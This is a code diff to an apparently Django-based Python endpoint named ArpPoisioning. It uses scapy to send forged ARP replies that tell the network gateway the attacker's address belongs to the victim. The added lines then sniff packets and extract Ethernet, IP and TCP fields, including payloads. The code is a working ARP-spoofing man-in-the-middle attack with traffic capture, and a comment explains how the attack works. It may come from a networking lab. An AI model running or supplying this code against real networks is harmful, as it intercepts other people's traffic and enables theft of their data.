@@ -136,7 +136,29 @@ def ArpPoisioning(request):
             # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
             gatewayARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
             scapy.send(gatewayARP_packet)
-            time.sleep(1)
+
+            # PacketList 
+            pcap = scapy.sniff(count=5)
+            for packet in pcap:
+                #print(packet.show())
+                if(packet.haslayer(scapy.Ether)):
+                    print(packet.show())
+                    ETHERNET_frame = packet.getlayer(scapy.Ether)
+                    ETHERNET_frame_destination = ETHERNET_frame.dst
+                    ETHERNET_frame_source = ETHERNET_frame.src
+                if(packet.haslayer(scapy.IP)):
+                    IP_packet = packet.getlayer(scapy.IP)
+                    IP_packet_source = IP_packet.src
+                    IP_packet_destination = IP_packet.dst
+                if(packet.haslayer(scapy.TCP)):
+                    tcp_packet = packet.getlayer(scapy.TCP)
+                    TCP_source_port = tcp_packet.sport
+                    TCP_destination_port = tcp_packet.dport
+                    TCP_flag = tcp_packet.flags
+                    TCP_data = tcp_packet
+                
+                
+                    
     except KeyboardInterrupt:
         print("Closing")
 
@@ -149,6 +171,8 @@ def ArpPoisioning(request):
     # Since ARP will resolve IP addresses to MAC addresses, the ARP packet will make the recipient think that that the IP address of psrc belongs to the MAC address of hwsrc. That's how the attack works.
 
     return Response(status=200)
+    
+
 
 @api_view(['DELETE'])
 def DeleteDatabase(self):
